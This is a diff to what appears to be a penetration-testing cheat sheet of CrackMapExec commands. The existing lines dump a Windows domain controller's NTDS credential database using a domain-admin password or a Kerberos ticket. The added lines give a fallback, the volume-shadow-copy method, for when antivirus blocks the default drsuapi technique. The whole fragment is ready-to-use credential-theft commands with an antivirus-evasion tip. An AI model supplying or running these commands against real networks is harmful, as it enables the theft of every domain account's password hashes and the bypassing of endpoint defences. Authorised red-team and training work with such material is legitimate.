@@ -182,4 +182,7 @@ sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds
 # CrackMapExec using kerberos ticket
 export KRB5CCNAME=<user>.ccache 
 sudo crackmapexec smb <target> --kerberos --ntds
+
+# Antivirus blocking drsuapi method, try vss instead
+sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds vss
 ```
